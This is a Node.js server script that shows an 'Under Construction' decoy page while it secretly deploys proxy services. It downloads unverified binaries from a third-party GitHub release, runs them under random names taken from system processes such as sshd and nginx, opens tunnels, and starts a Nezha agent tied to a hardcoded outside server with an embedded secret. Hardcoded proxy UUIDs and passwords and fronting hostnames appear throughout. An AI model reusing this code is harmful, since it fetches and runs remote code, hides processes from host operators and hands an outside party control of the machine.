const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawn, exec } = require('child_process');
const { URL } = require('url');
const crypto = require('crypto');
const net = require('net');

const CONFIG = {
    C_T: process.env.C_T || "",
    B_D: process.env.B_D || "www.shopify.com",
    C_D: process.env.C_D || "",
    N_S: process.env.N_S || "newnz.seav.eu.org",
    N_P: process.env.N_P || "443",
    N_K: process.env.N_K || "cRivpR7ScUwP51hJj7rLw7iCbUE6HmKg",
    NZ_UUID: process.env.NZ_UUID || "",
    N_T: process.env.N_T || "--tls",
    HY2_PORT: process.env.HY2_PORT || "",
    VLESS_PORT: process.env.VLESS_PORT || "8002",
    REALITY_PORT: process.env.REALITY_PORT || "",
    TUIC_PORT: process.env.TUIC_PORT || "",
    SERVER_IP: process.env.SERVER_IP || "",
    VLESS_UUID: process.env.VLESS_UUID || "feefeb96-bfcf-4a9b-aac0-6aac771c1b98",
    TUIC_UUID: process.env.TUIC_UUID || "feefeb96-bfcf-4a9b-aac0-6aac771c1b98",
    TUIC_PASSWORD: process.env.TUIC_PASSWORD || "789456",
    HY2_PASSWORD: process.env.HY2_PASSWORD || "789456",
    REALITY_PRIVATE_KEY: process.env.REALITY_PRIVATE_KEY || "",
    REALITY_PUBLIC_KEY: process.env.REALITY_PUBLIC_KEY || "",
    HY2_SNI: process.env.HY2_SNI || "www.bing.com",
    VLESS_PATH: process.env.VLESS_PATH || "/vls",
    REALITY_SNI: process.env.REALITY_SNI || "www.microsoft.com",
    REALITY_SHORT_ID: process.env.REALITY_SHORT_ID || "0123456789abcdef",
    TLS_CERT_PATH: process.env.TLS_CERT_PATH || "",
    TLS_KEY_PATH: process.env.TLS_KEY_PATH || "",
    PORT: process.env.PORT || 3000
};

const WORK_DIR = os.tmpdir();
const processes = [];
let serviceStatus = {singbox: 'stopped', cloudflared: 'stopped', nezha: 'stopped', http: 'stopped'};

const HTML_TEMPLATES = {
    home: `
        <html lang="en">
        <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Under Construction</title>
        <style>
        body{display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background-color:#f4f4f7;color:#333}
        .content{text-align:center}h1{font-size:2.5rem;margin-bottom:0.5rem;font-weight:300}p{color:#666;font-size:1.1rem}
        </style>
        </head>
        <body>
        <div class="content"><h1>Website Under Construction</h1><p>We are working on something amazing. Stay tuned.</p></div>
        </body>
        </html>
    `,
    status: (serverIp, links) => `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Service Status</title>
<style>
body{display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background-color:#f4f4f7;color:#333}
.card{background:white;padding:2rem;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.05);width:90%;max-width:520px}
h1{font-size:1.5rem;font-weight:300;margin:0 0 1.5rem 0;color:#111;text-align:center}
.label{font-size:0.75rem;color:#999;font-weight:600;display:block;margin-bottom:5px}
.value{font-family:monospace;background:#f9f9fa;color:#444;padding:10px;border-radius:6px;font-size:0.85rem;word-break:break-all;border:1px solid #eaeaea;margin-bottom:15px}
.row{display:flex;justify-content:space-between;gap:12px}
.chip{font-size:0.75rem;background:#f1f1f5;padding:6px 10px;border-radius:999px;color:#555}
.btn{width:100%;background-color:#333;color:white;border:none;padding:12px;border-radius:6px;cursor:pointer;font-size:0.9rem;transition:0.2s;margin-top:8px}
.btn:hover{background-color:#000}
</style>
</head>
<body>
<div class="card">
<h1>Service Status</h1>
<span class="label">STATUS</span>
<div class="row">
<span class="chip">singbox: ${serviceStatus.singbox}</span>
<span class="chip">cloudflared: ${serviceStatus.cloudflared}</span>
</div>
<div class="row" style="margin:8px 0 12px 0">
<span class="chip">nezha: ${serviceStatus.nezha}</span>
<span class="chip">http: ${serviceStatus.http}</span>
</div>
<span class="label">PORTS</span>
<div class="value">HTTP: ${CONFIG.PORT}
${CONFIG.VLESS_PORT ? ` | VLESS-WS: ${CONFIG.VLESS_PORT}` : ''}
${CONFIG.HY2_PORT ? ` | HY2: ${CONFIG.HY2_PORT}` : ''}
${CONFIG.REALITY_PORT ? ` | REALITY: ${CONFIG.REALITY_PORT}` : ''}
${CONFIG.TUIC_PORT ? ` | TUIC: ${CONFIG.TUIC_PORT}` : ''}</div>
<span class="label">SERVER IP</span><div class="value">${serverIp}</div>
${links.length > 0 ? links.map((link, idx) => `
<span class="label">${link.protocol}</span>
<div class="value" id="link-${idx}">${link.url}</div>
<button class="btn" onclick="navigator.clipboard.writeText(document.getElementById('link-${idx}').innerText).then(()=>this.innerText='Copied!')">Copy Link</button>
`).join('') : '<span class="label">LINK</span><div class="value">No active connections</div>'}
</div>
</body>
</html>`
};

const COMMON_PROCESS_NAMES = [
    'sshd', 'nginx', 'apache2', 'httpd', 'mysqld',
    'postgres', 'redis-server', 'memcached', 'ntpd',
    'systemd', 'crond', 'rsyslogd', 'supervisord',
    'node', 'python', 'php-fpm', 'java', 'ruby',
    'mongod', 'dockerd', 'containerd', 'snapd',
    'logrotate', 'udevd', 'syslogd', 'dbus-daemon',
    'cron', 'atd', 'dhclient', 'polkitd', 'irqbalance'
];

function getRandomProcessName() {
    return COMMON_PROCESS_NAMES[Math.floor(Math.random() * COMMON_PROCESS_NAMES.length)];
}

function detectArch() {
    const arch = process.arch;
    return arch === 'x64' ? 'amd64' : arch === 'arm64' ? 'arm64' : (process.exit(1), '');
}

function requestStream(url, redirectCount = 0) {
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const client = parsedUrl.protocol === 'https:' ? https : http;
        const req = client.get(parsedUrl, { headers: { 'User-Agent': 'node' } }, (res) => {
            const statusCode = res.statusCode || 0;
            if ([301, 302, 303, 307, 308].includes(statusCode) && res.headers.location) {
                res.resume();
                if (redirectCount >= 5) {
                    reject(new Error('Too many redirects'));
                    return;
                }
                const nextUrl = new URL(res.headers.location, parsedUrl).toString();
                requestStream(nextUrl, redirectCount + 1).then(resolve, reject);
                return;
            }
            if (statusCode >= 400) {
                res.resume();
                reject(new Error(`Request failed: ${statusCode}`));
                return;
            }
            resolve(res);
        });
        req.on('error', reject);
    });
}

async function requestText(url) {
    const res = await requestStream(url);
    return new Promise((resolve, reject) => {
        let data = '';
        res.setEncoding('utf8');
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve(data));
        res.on('error', reject);
    });
}

async function downloadBinary(url, filepath) {
    const response = await requestStream(url);
    const writer = fs.createWriteStream(filepath);
    return new Promise((resolve, reject) => {
        response.pipe(writer);
        response.on('error', reject);
        writer.on('finish', () => {
            fs.chmodSync(filepath, 0o755);
            resolve();
        });
        writer.on('error', reject);
    });
}

async function getServerIP() {
    try {
        const data = await requestText('https://ipv4.icanhazip.com');
        return data.trim();
    } catch (error) {
        return '127.0.0.1';
    }
}

async function startTempTunnel(cloudflaredFile, port) {
    return new Promise((resolve) => {
        for (let i = 0; i < 3; i++) {
            const logFile = path.join(WORK_DIR, `cf_${crypto.randomBytes(4).toString('hex')}.log`);
            
            const process = spawn(cloudflaredFile, [
                'tunnel', '--no-autoupdate', '--url', `http://localhost:${port}`
            ], { stdio: ['ignore', 'pipe', 'pipe'] });
            
            processes.push(process);
            
            const logStream = fs.createWriteStream(logFile);
            process.stdout.pipe(logStream);
            process.stderr.pipe(logStream);
            
            serviceStatus.cloudflared = 'running';
            
            process.on('error', () => {
                serviceStatus.cloudflared = 'error';
            });
            
            process.on('exit', (code) => {
                if (code !== 0) {
                    serviceStatus.cloudflared = 'stopped';
                }
            });
            
            setTimeout(() => {
                try {
                    const logContent = fs.readFileSync(logFile, 'utf8');
                    const match = logContent.match(/https:\/\/([^\/\s]+\.trycloudflare\.com)/);
                    if (match) {
                        CONFIG.C_D = match[1];
                        try { fs.unlinkSync(logFile); } catch (e) {}
                        return resolve(true);
                    }
                } catch (e) {}
                
                process.kill();
                try { fs.unlinkSync(logFile); } catch (e) {}
                
                if (i === 2) {
                    serviceStatus.cloudflared = 'error';
                    resolve(false);
                }
            }, 10000);
        }
    });
}

async function generateRealityKeys(singboxFile) {
    if (!CONFIG.REALITY_PORT || (CONFIG.REALITY_PRIVATE_KEY && CONFIG.REALITY_PUBLIC_KEY)) {
        return;
    }
    
    return new Promise((resolve) => {
        exec(`"${singboxFile}" generate reality-keypair`, (error, stdout) => {
            if (!error && stdout) {
                const privateMatch = stdout.match(/PrivateKey:\s*(\S+)/);
                const publicMatch = stdout.match(/PublicKey:\s*(\S+)/);
                
                if (privateMatch && publicMatch) {
                    CONFIG.REALITY_PRIVATE_KEY = privateMatch[1];
                    CONFIG.REALITY_PUBLIC_KEY = publicMatch[1];
                }
            }
            resolve();
        });
    });
}

async function ensureSelfSignedCertificate() {
    if (CONFIG.TLS_CERT_PATH && CONFIG.TLS_KEY_PATH) {
        return { certPath: CONFIG.TLS_CERT_PATH, keyPath: CONFIG.TLS_KEY_PATH };
    }

    const certPath = path.join(WORK_DIR, 'cert.pem');
    const keyPath = path.join(WORK_DIR, 'key.pem');
    if (fs.existsSync(certPath) && fs.existsSync(keyPath)) {
        return { certPath, keyPath };
    }

    const derLength = (len) => {
        if (len < 0x80) return Buffer.from([len]);
        const bytes = [];
        let n = len;
        while (n > 0) {
            bytes.unshift(n & 0xff);
            n >>= 8;
        }
        return Buffer.from([0x80 | bytes.length, ...bytes]);
    };

    const der = (tag, content) => Buffer.concat([Buffer.from([tag]), derLength(content.length), content]);
    const derSeq = (items) => der(0x30, Buffer.concat(items));
    const derSet = (items) => der(0x31, Buffer.concat(items));
    const derNull = () => der(0x05, Buffer.alloc(0));
    const derBool = (value) => der(0x01, Buffer.from([value ? 0xff : 0x00]));
    const derInt = (buf) => {
        let v = Buffer.isBuffer(buf) ? Buffer.from(buf) : Buffer.from([buf]);
        if (v[0] & 0x80) v = Buffer.concat([Buffer.from([0x00]), v]);
        return der(0x02, v);
    };
    const derOID = (oid) => {
        const parts = oid.split('.').map(Number);
        const first = 40 * parts[0] + parts[1];
        const bytes = [first];
        for (let i = 2; i < parts.length; i++) {
            let n = parts[i];
            const stack = [];
            do {
                stack.unshift(n & 0x7f);
                n >>= 7;
            } while (n > 0);
            for (let j = 0; j < stack.length - 1; j++) stack[j] |= 0x80;
            bytes.push(...stack);
        }
        return der(0x06, Buffer.from(bytes));
    };
    const derUTF8 = (str) => der(0x0c, Buffer.from(str, 'utf8'));
    const derUTCTime = (date) => {
        const pad = (n) => String(n).padStart(2, '0');
        const year = String(date.getUTCFullYear()).slice(-2);
        const str = `${year}${pad(date.getUTCMonth() + 1)}${pad(date.getUTCDate())}${pad(date.getUTCHours())}${pad(date.getUTCMinutes())}${pad(date.getUTCSeconds())}Z`;
        return der(0x17, Buffer.from(str, 'ascii'));
    };
    const derBitString = (data) => der(0x03, Buffer.concat([Buffer.from([0x00]), data]));
    const derOctetString = (data) => der(0x04, data);

    const commonName = CONFIG.B_D || CONFIG.C_D || CONFIG.HY2_SNI || 'localhost';
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    const publicKeyDer = publicKey.export({ type: 'spki', format: 'der' });
    const privateKeyPem = privateKey.export({ type: 'pkcs1', format: 'pem' });

    const name = derSeq([
        derSet([
            derSeq([
                derOID('2.5.4.3'),
                derUTF8(commonName)
            ])
        ])
    ]);

    const now = new Date();
    const notBefore = new Date(now.getTime() - 60 * 1000);
    const notAfter = new Date(now.getTime());
    notAfter.setUTCFullYear(notBefore.getUTCFullYear() + 10);
    const validity = derSeq([derUTCTime(notBefore), derUTCTime(notAfter)]);

    const sigAlg = derSeq([derOID('1.2.840.113549.1.1.11'), derNull()]);

    const altNames = new Set([CONFIG.B_D, CONFIG.C_D, CONFIG.HY2_SNI].filter(Boolean));
    const sanItems = Array.from(altNames).map((name) => {
        const value = Buffer.from(name, 'ascii');
        return Buffer.concat([Buffer.from([0x82]), derLength(value.length), value]);
    });
    const san = sanItems.length ? derSeq(sanItems) : null;

    const basicConstraints = derSeq([derBool(false)]);
    const keyUsageBits = Buffer.from([0x05, 0xA0]);
    const keyUsage = der(0x03, keyUsageBits);
    const extKeyUsage = derSeq([
        derOID('1.3.6.1.5.5.7.3.1'),
        derOID('1.3.6.1.5.5.7.3.2')
    ]);

    const extensions = [
        derSeq([derOID('2.5.29.19'), derBool(true), derOctetString(basicConstraints)]),
        derSeq([derOID('2.5.29.15'), derBool(true), derOctetString(keyUsage)]),
        derSeq([derOID('2.5.29.37'), derBool(false), derOctetString(extKeyUsage)])
    ];
    if (san) {
        extensions.push(derSeq([derOID('2.5.29.17'), derBool(false), derOctetString(san)]));
    }
    const extensionsSeq = derSeq(extensions);
    const extensionsExplicit = Buffer.concat([Buffer.from([0xA3]), derLength(extensionsSeq.length), extensionsSeq]);

    const serial = crypto.randomBytes(16);
    const version = Buffer.concat([Buffer.from([0xA0]), derLength(3), derInt(2)]);
    const tbs = derSeq([
        version,
        derInt(serial),
        sigAlg,
        name,
        validity,
        name,
        Buffer.from(publicKeyDer),
        extensionsExplicit
    ]);

    const signer = crypto.createSign('RSA-SHA256');
    signer.update(tbs);
    signer.end();
    const signature = signer.sign(privateKeyPem);

    const certDer = derSeq([tbs, sigAlg, derBitString(signature)]);
    const certPem = `-----BEGIN CERTIFICATE-----\n${certDer.toString('base64').match(/.{1,64}/g).join('\n')}\n-----END CERTIFICATE-----\n`;

    fs.writeFileSync(certPath, certPem);
    fs.writeFileSync(keyPath, privateKeyPem);

    return { certPath, keyPath };
}

async function generateSingBoxConfig() {
    const inbounds = [];
    let tlsPaths = null;

    if (CONFIG.HY2_PORT || CONFIG.TUIC_PORT) {
        tlsPaths = await ensureSelfSignedCertificate();
    }
    
    if (CONFIG.HY2_PORT) {
        inbounds.push({
            type: "hysteria2",
            tag: "hy2-in",
            listen: "0.0.0.0",
            listen_port: parseInt(CONFIG.HY2_PORT),
            users: [{password: CONFIG.HY2_PASSWORD}],
            tls: {
                enabled: true,
                server_name: CONFIG.HY2_SNI,
                key_path: tlsPaths.keyPath,
                certificate_path: tlsPaths.certPath,
                alpn: ["h3"]
            }
        });
    }
    
    if (CONFIG.VLESS_PORT) {
        inbounds.push({
            type: "vless",
            tag: "vless-in",
            listen: "0.0.0.0",
            listen_port: parseInt(CONFIG.VLESS_PORT),
            users: [{uuid: CONFIG.VLESS_UUID}],
            transport: {type: "ws", path: CONFIG.VLESS_PATH, headers: {}}
        });
    }
    
    if (CONFIG.REALITY_PORT) {
        inbounds.push({
            type: "vless",
            tag: "reality-in",
            listen: "0.0.0.0",
            listen_port: parseInt(CONFIG.REALITY_PORT),
            users: [{uuid: CONFIG.VLESS_UUID, flow: "xtls-rprx-vision"}],
            tls: {
                enabled: true,
                server_name: CONFIG.REALITY_SNI,
                reality: {
                    enabled: true,
                    handshake: {
                        server: CONFIG.REALITY_SNI,
                        server_port: 443
                    },
                    private_key: CONFIG.REALITY_PRIVATE_KEY,
                    short_id: [CONFIG.REALITY_SHORT_ID]
                }
            }
        });
    }
    
    if (CONFIG.TUIC_PORT) {
        inbounds.push({
            type: "tuic",
            tag: "tuic-in",
            listen: "0.0.0.0",
            listen_port: parseInt(CONFIG.TUIC_PORT),
            users: [{uuid: CONFIG.TUIC_UUID, password: CONFIG.TUIC_PASSWORD}],
            congestion_control: "cubic",
            auth_timeout: "3s",
            zero_rtt_handshake: false,
            heartbeat: "10s",
            tls: {
                enabled: true,
                certificate_path: tlsPaths.certPath,
                key_path: tlsPaths.keyPath,
                alpn: ["h3"]
            }
        });
    }

    const config = {
        log: {level: "warn", timestamp: true},
        dns: {
            servers: [
                {
                    tag: "google",
                    address: "8.8.8.8"
                },
                {
                    tag: "cloudflare",
                    address: "1.1.1.1"
                }
            ],
            final: "google"
        },
        inbounds,
        outbounds: [
            {
                type: "direct", 
                tag: "direct"
            },
            {
                type: "block", 
                tag: "block"
            }
        ],
        route: {
            rules: [
                {ip_is_private: true, outbound: "direct"}
            ],
            final: "direct"
        },
        experimental: {
            cache_file: {
                enabled: true,
                path: path.join(WORK_DIR, "cache.db")
            }
        }
    };
    
    const configPath = path.join(WORK_DIR, 'config.json');
    fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
    return configPath;
}

function generateLinks(serverIp) {
    const links = [];
    const namePrefix = CONFIG.C_D ? `${CONFIG.C_D}-` : '';
    
    if (CONFIG.HY2_PORT) {
        links.push({
            protocol: 'Hysteria2',
            url: `hysteria2://${CONFIG.HY2_PASSWORD}@${serverIp}:${CONFIG.HY2_PORT}?insecure=1&sni=${CONFIG.HY2_SNI}&alpn=h3#${namePrefix}HY2`
        });
    }
    
    if (CONFIG.VLESS_PORT) {
        links.push({
            protocol: 'VLESS-WS',
            url: `vless://${CONFIG.VLESS_UUID}@${CONFIG.B_D}:443?encryption=none&security=tls&sni=${CONFIG.C_D}&type=ws&host=${CONFIG.C_D}&path=${encodeURIComponent(CONFIG.VLESS_PATH)}#${namePrefix}VLESS-WS`
        });
    }
    
    if (CONFIG.REALITY_PORT) {
        links.push({
            protocol: 'Reality',
            url: `vless://${CONFIG.VLESS_UUID}@${serverIp}:${CONFIG.REALITY_PORT}?encryption=none&flow=xtls-rprx-vision&security=reality&sni=${CONFIG.REALITY_SNI}&fp=chrome&pbk=${CONFIG.REALITY_PUBLIC_KEY}&sid=${CONFIG.REALITY_SHORT_ID}&type=tcp#${namePrefix}REALITY`
        });
    }
    
    if (CONFIG.TUIC_PORT) {
        links.push({
            protocol: 'TUIC',
            url: `tuic://${CONFIG.TUIC_UUID}:${CONFIG.TUIC_PASSWORD}@${serverIp}:${CONFIG.TUIC_PORT}?congestion_control=cubic&udp_relay_mode=native&alpn=h3,spdy/3.1&allow_insecure=1#${namePrefix}TUIC`
        });
    }
    
    return links;
}

function cleanup() {
    processes.forEach(proc => {
        try { proc.kill(); } catch (e) {}
    });
    process.exit(0);
}

async function startService(file, args, name, options = {}) {
    try {
        const proc = spawn(file, args, { stdio: ['ignore', 'pipe', 'pipe'], ...options });
        
        if (options.logFile) {
            const logStream = fs.createWriteStream(options.logFile);
            proc.stdout.pipe(logStream);
            proc.stderr.pipe(logStream);
        }
        
        serviceStatus[name.toLowerCase()] = 'running';
        
        proc.on('spawn', () => {
            serviceStatus[name.toLowerCase()] = 'running';
        });
        
        proc.on('error', () => {
            serviceStatus[name.toLowerCase()] = 'error';
        });
        
        proc.on('exit', () => {
            serviceStatus[name.toLowerCase()] = 'stopped';
        });
        
        return new Promise((resolve) => {
            const checkRunning = () => {
                if (proc.killed) {
                    serviceStatus[name.toLowerCase()] = 'stopped';
                    resolve(null);
                } else {
                    processes.push(proc);
                    resolve(proc);
                }
            };
            
            setTimeout(checkRunning, 2000);
        });
    } catch (error) {
        serviceStatus[name.toLowerCase()] = 'error';
        return null;
    }
}

function formatHeaderValue(value) {
    if (Array.isArray(value)) return value.join(', ');
    return value === undefined ? '' : String(value);
}

async function renderStatus(res) {
    const serverIp = await getServerIP();
    const links = generateLinks(serverIp);
    res.writeHead(200, { 'Content-Type': 'text/html' });
    res.end(HTML_TEMPLATES.status(serverIp, links));
}

const server = http.createServer(async (req, res) => {
    const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);
    if (req.method !== 'GET') {
        res.writeHead(405, { 'Content-Type': 'text/plain' });
        res.end('Method Not Allowed');
        return;
    }

    if (url.pathname === '/') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(HTML_TEMPLATES.home);
        return;
    }

    if (url.pathname === '/status' || url.pathname === '/x') {
        await renderStatus(res);
        return;
    }

    if (url.pathname === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok', uptime: process.uptime() }));
        return;
    }

    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
});

server.on('upgrade', (req, socket, head) => {
    if (!CONFIG.VLESS_PORT) {
        socket.destroy();
        return;
    }

    const target = net.connect({ host: '127.0.0.1', port: Number(CONFIG.VLESS_PORT) }, () => {
        const requestLine = `${req.method} ${req.url} HTTP/${req.httpVersion}\r\n`;
        const headerLines = Object.entries(req.headers)
            .map(([key, value]) => `${key}: ${formatHeaderValue(value)}`)
            .join('\r\n');
        target.write(`${requestLine}${headerLines}\r\n\r\n`);
        if (head && head.length) target.write(head);
        socket.pipe(target);
        target.pipe(socket);
    });

    const handleError = () => {
        try { socket.destroy(); } catch (e) {}
        try { target.destroy(); } catch (e) {}
    };
    socket.on('error', handleError);
    target.on('error', handleError);
});

async function main() {
    server.listen(CONFIG.PORT, () => {
        serviceStatus.http = 'running';
    });
    
    try {
        const arch = detectArch();
        const isArm = arch === 'arm64';
        
        const singboxName = getRandomProcessName();
        const cloudflaredName = getRandomProcessName();
        const nezhaName = getRandomProcessName();
        
        const singboxFile = path.join(WORK_DIR, singboxName);
        const cloudflaredFile = path.join(WORK_DIR, cloudflaredName);
        const nezhaFile = path.join(WORK_DIR, nezhaName);
        
        const downloadUrls = {
            singbox: isArm ? 'https://github.com/seav1/dl/releases/download/files/sb-arm' : 'https://github.com/seav1/dl/releases/download/files/sb',
            cloudflared: isArm ? 'https://github.com/seav1/dl/releases/download/files/cf-arm' : 'https://github.com/seav1/dl/releases/download/files/cf',
            nezha: isArm ? 'https://github.com/seav1/dl/releases/download/files/nzv1-arm' : 'https://github.com/seav1/dl/releases/download/files/nzv1'
        };
        
        await Promise.all([
            downloadBinary(downloadUrls.singbox, singboxFile),
            downloadBinary(downloadUrls.cloudflared, cloudflaredFile),
            downloadBinary(downloadUrls.nezha, nezhaFile)
        ]);
        
        [singboxFile, cloudflaredFile, nezhaFile].forEach(file => {
            if (!fs.existsSync(file)) throw new Error(`文件未找到: ${file}`);
        });
        
        const serverIp = await getServerIP();
        
        if (CONFIG.HY2_PORT || CONFIG.VLESS_PORT || CONFIG.REALITY_PORT || CONFIG.TUIC_PORT) {
            await generateRealityKeys(singboxFile);
            const configPath = await generateSingBoxConfig();
            
            try {
                await new Promise((resolve, reject) => {
                    exec(`"${singboxFile}" check -c "${configPath}"`, (error) => {
                        if (error) {
                            reject(error);
                        } else {
                            resolve();
                        }
                    });
                });
                
                await startService(singboxFile, ['run', '-c', configPath], 'singbox');
            } catch (error) {
                serviceStatus.singbox = 'error';
            }
        }
        
        if (CONFIG.C_T) {
            try {
                const args = [
                    'tunnel', 
                    '--edge-ip-version', 'auto', 
                    '--protocol', 'http2',
                    '--no-autoupdate',
                    'run', 
                    '--token', CONFIG.C_T, 
                    '--url', `http://localhost:${CONFIG.PORT}`
                ];
                
                await startService(cloudflaredFile, args, 'cloudflared');
            } catch (error) {
                serviceStatus.cloudflared = 'error';
            }
        } else if (CONFIG.VLESS_PORT) {
            const tunnelResult = await startTempTunnel(cloudflaredFile, CONFIG.PORT);
            if (!tunnelResult) {
                serviceStatus.cloudflared = 'error';
            }
        }
        
        if (CONFIG.N_S && CONFIG.N_K) {
            const nezhaEnv = { ...process.env };
            nezhaEnv['NZ_SERVER'] = `${CONFIG.N_S}:${CONFIG.N_P}`;
            nezhaEnv['NZ_CLIENT_SECRET'] = CONFIG.N_K;
            if (CONFIG.NZ_UUID) {
                nezhaEnv['NZ_UUID'] = CONFIG.NZ_UUID;
            }
            
            if (CONFIG.N_T === '--tls' || (typeof CONFIG.N_T === 'string' && CONFIG.N_T.includes('--tls'))) {
                nezhaEnv['NZ_TLS'] = 'true';
            }
            
            try {
                await startService(nezhaFile, [], 'nezha', {
                    logFile: path.join(WORK_DIR, 'nezha.log'),
                    env: nezhaEnv
                });
            } catch (error) {
                serviceStatus.nezha = 'error';
            }
        }
        
        setInterval(() => {
            processes.forEach(proc => {
                if (proc.killed) {
                    const serviceName = Object.keys(serviceStatus).find(key => 
                        serviceStatus[key] === 'running' && !processes.some(p => p !== proc && !p.killed));
                    
                    if (serviceName) {
                        serviceStatus[serviceName] = 'stopped';
                    }
                }
            });
            
            if (processes.length > 0 && processes.every(proc => proc.killed)) {
                cleanup();
            }
        }, 10000);
        
        process.on('SIGINT', cleanup);
        process.on('SIGTERM', cleanup);
        
    } catch (error) {
        process.exit(1);
    }
}

main().catch(() => process.exit(1));